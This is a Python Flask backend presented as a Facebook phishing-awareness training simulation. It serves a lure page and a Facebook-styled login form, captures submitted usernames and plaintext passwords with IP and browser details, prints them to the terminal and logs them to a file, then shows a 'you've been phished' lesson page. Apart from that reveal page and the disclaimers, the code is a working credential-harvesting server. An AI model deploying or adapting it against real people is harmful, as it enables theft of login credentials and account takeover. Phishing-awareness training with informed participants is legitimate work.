"""
Enhanced Facebook Login Simulation - Flask Backend
Educational Cybersecurity Training Application v2.0

IMPORTANT: This application is designed ONLY for educational purposes
to demonstrate how phishing attacks work and to train users in 
cybersecurity awareness. Never use this for malicious purposes.
"""

from flask import Flask, request, send_from_directory
import os
from datetime import datetime
from colorama import init, Fore, Back, Style
import json

# Initialize colorama for colored terminal output
init(autoreset=True)

app = Flask(__name__)

# Store the current directory
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, 'phishing_training_log.txt')

def print_banner():
    """Print a beautiful banner for the application"""
    banner = f"""
{Fore.CYAN}{'═' * 80}
{Fore.CYAN}║{' ' * 78}║
{Fore.CYAN}║{Fore.YELLOW}{'🎓 FACEBOOK PHISHING SIMULATION - CYBERSECURITY TRAINING'.center(78)}{Fore.CYAN}║
{Fore.CYAN}║{' ' * 78}║
{Fore.CYAN}{'═' * 80}

{Fore.YELLOW}⚠️  EDUCATIONAL PURPOSE ONLY{Style.RESET_ALL}
   This application demonstrates credential theft in phishing attacks.
   Use only in controlled training environments with informed participants.

{Fore.GREEN}🌐 Server Information:{Style.RESET_ALL}
   → Local URL:   {Fore.CYAN}http://127.0.0.1:5000{Style.RESET_ALL}
   → Network URL: {Fore.CYAN}http://localhost:5000{Style.RESET_ALL}
   → Log File:    {Fore.CYAN}{LOG_FILE}{Style.RESET_ALL}

{Fore.MAGENTA}📝 Teaching Instructions:{Style.RESET_ALL}
   1. Students navigate to the URL
   2. They enter demo credentials
   3. Show this terminal to reveal captured data
   4. Discuss phishing indicators and prevention
   5. Review log file for session history

{Fore.RED}🛑 Press CTRL+C to stop the server{Style.RESET_ALL}
{Fore.CYAN}{'═' * 80}{Style.RESET_ALL}
"""
    print(banner)

def log_credentials(username, password, ip_address, user_agent):
    """Log captured credentials to file for later review"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    log_entry = f"""
{'=' * 80}
Capture Time: {timestamp}
Username/Email: {username}
Password: {password}
IP Address: {ip_address}
User Agent: {user_agent}
{'=' * 80}

"""
    
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(log_entry)
    except Exception as e:
        print(f"{Fore.RED}Error writing to log file: {e}{Style.RESET_ALL}")

def display_capture(username, password, ip_address, user_agent, browser_name):
    """Display captured credentials in a beautiful format"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    print(f"\n{Fore.RED}{'╔' + '═' * 78 + '╗'}")
    print(f"{Fore.RED}║{Back.RED}{Fore.WHITE}{'🔓 CREDENTIAL CAPTURE DETECTED'.center(78)}{Style.RESET_ALL}{Fore.RED}║")
    print(f"{Fore.RED}{'╠' + '═' * 78 + '╣'}{Style.RESET_ALL}")
    
    print(f"{Fore.RED}║{Style.RESET_ALL} {Fore.YELLOW}📅 Timestamp:{Style.RESET_ALL}     {timestamp:<59} {Fore.RED}║{Style.RESET_ALL}")
    print(f"{Fore.RED}║{Style.RESET_ALL} {Fore.YELLOW}🌐 IP Address:{Style.RESET_ALL}    {ip_address:<59} {Fore.RED}║{Style.RESET_ALL}")
    print(f"{Fore.RED}║{Style.RESET_ALL} {Fore.YELLOW}🌍 Browser:{Style.RESET_ALL}       {browser_name:<59} {Fore.RED}║{Style.RESET_ALL}")
    
    print(f"{Fore.RED}{'╠' + '═' * 78 + '╣'}{Style.RESET_ALL}")
    
    print(f"{Fore.RED}║{Style.RESET_ALL} {Fore.CYAN}📧 USERNAME/EMAIL:{Style.RESET_ALL} {' ' * 56} {Fore.RED}║{Style.RESET_ALL}")
    print(f"{Fore.RED}║{Style.RESET_ALL}    {Fore.WHITE}{Back.BLACK}{username:<74}{Style.RESET_ALL} {Fore.RED}║{Style.RESET_ALL}")
    
    print(f"{Fore.RED}║{Style.RESET_ALL} {' ' * 77} {Fore.RED}║{Style.RESET_ALL}")
    
    print(f"{Fore.RED}║{Style.RESET_ALL} {Fore.CYAN}🔑 PASSWORD (PLAIN TEXT):{Style.RESET_ALL} {' ' * 48} {Fore.RED}║{Style.RESET_ALL}")
    print(f"{Fore.RED}║{Style.RESET_ALL}    {Fore.WHITE}{Back.BLACK}{password:<74}{Style.RESET_ALL} {Fore.RED}║{Style.RESET_ALL}")
    
    print(f"{Fore.RED}{'╠' + '═' * 78 + '╣'}{Style.RESET_ALL}")
    
    print(f"{Fore.RED}║{Style.RESET_ALL} {Fore.GREEN}✅ TEACHING POINTS:{Style.RESET_ALL} {' ' * 56} {Fore.RED}║{Style.RESET_ALL}")
    print(f"{Fore.RED}║{Style.RESET_ALL}    → Password captured in plain text - NO ENCRYPTION {' ' * 20} {Fore.RED}║{Style.RESET_ALL}")
    print(f"{Fore.RED}║{Style.RESET_ALL}    → Attacker can see exact password as typed {' ' * 28} {Fore.RED}║{Style.RESET_ALL}")
    print(f"{Fore.RED}║{Style.RESET_ALL}    → URL verification is critical (check domain name) {' ' * 21} {Fore.RED}║{Style.RESET_ALL}")
    print(f"{Fore.RED}║{Style.RESET_ALL}    → Always look for HTTPS and correct domain {' ' * 28} {Fore.RED}║{Style.RESET_ALL}")
    print(f"{Fore.RED}║{Style.RESET_ALL}    → Enable 2FA to protect against credential theft {' ' * 23} {Fore.RED}║{Style.RESET_ALL}")
    
    print(f"{Fore.RED}{'╚' + '═' * 78 + '╝'}{Style.RESET_ALL}\n")
    
    print(f"{Fore.YELLOW}💾 Credentials saved to: {Fore.CYAN}{LOG_FILE}{Style.RESET_ALL}\n")

def get_browser_name(user_agent):
    """Extract browser name from user agent"""
    user_agent = user_agent.lower()
    if 'chrome' in user_agent and 'edg' not in user_agent:
        return 'Chrome'
    elif 'firefox' in user_agent:
        return 'Firefox'
    elif 'safari' in user_agent and 'chrome' not in user_agent:
        return 'Safari'
    elif 'edg' in user_agent:
        return 'Edge'
    elif 'opera' in user_agent or 'opr' in user_agent:
        return 'Opera'
    else:
        return 'Unknown Browser'

@app.route('/')
def index():
    """Serve the attractive offer page (phishing bait)"""
    return send_from_directory(BASE_DIR, 'facebook_offer.html')

@app.route('/login')
def login_page():
    """Serve the login page after clicking the offer"""
    return send_from_directory(BASE_DIR, 'facebook_login.html')

@app.route('/<path:filename>')
def serve_static(filename):
    """Serve static files (CSS, JS, etc.)"""
    return send_from_directory(BASE_DIR, filename)

@app.route('/submit-login', methods=['POST'])
def submit_login():
    """
    Handle login form submission
    EDUCATIONAL PURPOSES ONLY - demonstrates credential capture
    """
    try:
        # Get form data
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        # Get client information
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'Unknown')
        browser_name = get_browser_name(user_agent)
        
        # Display captured credentials in terminal
        display_capture(username, password, ip_address, user_agent, browser_name)
        
        # Log to file
        log_credentials(username, password, ip_address, user_agent)
        
        # Return enhanced success page
        return f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Training Complete - Important Lesson Learned</title>
            <style>
                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
                body {{
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    min-height: 100vh;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    padding: 20px;
                    animation: gradientShift 10s ease infinite;
                    background-size: 200% 200%;
                }}
                @keyframes gradientShift {{
                    0%, 100% {{ background-position: 0% 50%; }}
                    50% {{ background-position: 100% 50%; }}
                }}
                .message-card {{
                    background: white;
                    border-radius: 20px;
                    padding: 48px 40px;
                    max-width: 700px;
                    box-shadow: 0 30px 80px rgba(0, 0, 0, 0.4);
                    text-align: center;
                    animation: slideUp 0.6s ease-out;
                }}
                @keyframes slideUp {{
                    from {{ opacity: 0; transform: translateY(50px); }}
                    to {{ opacity: 1; transform: translateY(0); }}
                }}
                .icon {{
                    font-size: 80px;
                    margin-bottom: 24px;
                    animation: bounce 1s ease-in-out;
                }}
                @keyframes bounce {{
                    0%, 100% {{ transform: translateY(0); }}
                    50% {{ transform: translateY(-20px); }}
                }}
                h1 {{
                    color: #2d3748;
                    font-size: 36px;
                    margin-bottom: 16px;
                    font-weight: 700;
                }}
                .subtitle {{
                    color: #718096;
                    font-size: 18px;
                    margin-bottom: 32px;
                }}
                .warning-box {{
                    background: linear-gradient(135deg, #fff5f5 0%, #ffe5e5 100%);
                    border-left: 6px solid #f56565;
                    padding: 24px;
                    margin: 24px 0;
                    border-radius: 12px;
                    text-align: left;
                    box-shadow: 0 4px 12px rgba(245, 101, 101, 0.2);
                }}
                .warning-box h2 {{
                    color: #c53030;
                    font-size: 22px;
                    margin-bottom: 16px;
                    display: flex;
                    align-items: center;
                    gap: 10px;
                }}
                .warning-box ul {{
                    color: #2d3748;
                    line-height: 2;
                    margin-left: 24px;
                }}
                .warning-box li {{
                    margin: 10px 0;
                }}
                .success-box {{
                    background: linear-gradient(135deg, #f0fff4 0%, #e5ffe5 100%);
                    border-left: 6px solid #48bb78;
                    padding: 24px;
                    margin: 24px 0;
                    border-radius: 12px;
                    box-shadow: 0 4px 12px rgba(72, 187, 120, 0.2);
                }}
                .success-box h3 {{
                    color: #2f855a;
                    font-size: 20px;
                    margin-bottom: 12px;
                }}
                .success-box ul {{
                    color: #276749;
                    line-height: 2;
                    text-align: left;
                    margin-left: 24px;
                }}
                .info-box {{
                    background: linear-gradient(135deg, #ebf8ff 0%, #e5f5ff 100%);
                    border-left: 6px solid #4299e1;
                    padding: 20px;
                    margin: 24px 0;
                    border-radius: 12px;
                    text-align: left;
                }}
                .info-box p {{
                    color: #2c5282;
                    font-size: 15px;
                    line-height: 1.8;
                }}
                .info-box strong {{
                    color: #2a4365;
                }}
                .btn {{
                    display: inline-block;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    padding: 16px 48px;
                    border-radius: 50px;
                    text-decoration: none;
                    font-weight: 700;
                    margin-top: 32px;
                    transition: all 0.3s ease;
                    box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
                    font-size: 18px;
                }}
                .btn:hover {{
                    transform: translateY(-3px);
                    box-shadow: 0 8px 25px rgba(102, 126, 234, 0.6);
                }}
                .captured-data {{
                    background: #2d3748;
                    color: #48bb78;
                    padding: 20px;
                    border-radius: 8px;
                    margin: 20px 0;
                    font-family: 'Courier New', monospace;
                    text-align: left;
                }}
                .captured-data .label {{
                    color: #90cdf4;
                    font-weight: bold;
                }}
            </style>
        </head>
        <body>
            <div class="message-card">
                <div class="icon">⚠️</div>
                <h1>You've Been "Phished"!</h1>
                <p class="subtitle">This was a cybersecurity training demonstration</p>
                
                <div class="warning-box">
                    <h2>🎯 What Just Happened?</h2>
                    <ul>
                        <li><strong>Your credentials were captured</strong> - Username and password sent to the server</li>
                        <li><strong>Password visible in plain text</strong> - No encryption, fully readable</li>
                        <li><strong>This page looked like Facebook</strong> - But it wasn't the real site</li>
                        <li><strong>Your browser information was logged</strong> - IP address and browser type</li>
                    </ul>
                </div>

                <div class="captured-data">
                    <div><span class="label">📧 Captured Email:</span> {username}</div>
                    <div><span class="label">🔑 Captured Password:</span> {password}</div>
                    <div><span class="label">🌐 Your IP Address:</span> {ip_address}</div>
                    <div><span class="label">🌍 Your Browser:</span> {browser_name}</div>
                </div>
                
                <div class="success-box">
                    <h3>🛡️ How to Protect Yourself:</h3>
                    <ul>
                        <li><strong>Check the URL</strong> - Always verify you're on the correct domain (e.g., facebook.com, not faceb00k.com)</li>
                        <li><strong>Look for HTTPS</strong> - Secure sites have a padlock icon in the address bar</li>
                        <li><strong>Never click email links</strong> - Type URLs directly or use bookmarks</li>
                        <li><strong>Enable Two-Factor Authentication (2FA)</strong> - Protects even if password is stolen</li>
                        <li><strong>Use a password manager</strong> - They only autofill on legitimate sites</li>
                        <li><strong>Stay suspicious</strong> - If something feels off, it probably is</li>
                    </ul>
                </div>
                
                <div class="info-box">
                    <p><strong>💡 Remember:</strong> Real phishing attacks look IDENTICAL to legitimate sites. 
                    The only way to protect yourself is to carefully verify URLs, use 2FA, and stay vigilant. 
                    Never enter sensitive information on websites you reached through email links or suspicious sources.</p>
                </div>
                
                <a href="/" class="btn">⟲ Try the Simulation Again</a>
            </div>
        </body>
        </html>
        """
        
    except Exception as e:
        print(f"\n{Fore.RED}❌ Error occurred: {str(e)}{Style.RESET_ALL}\n")
        return f"An error occurred: {str(e)}", 500

if __name__ == '__main__':
    print_banner()
    
    # Create log file if it doesn't exist
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'w', encoding='utf-8') as f:
            f.write(f"Phishing Training Log - Created {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n\n")
    
    app.run(debug=True, host='0.0.0.0', port=5000)
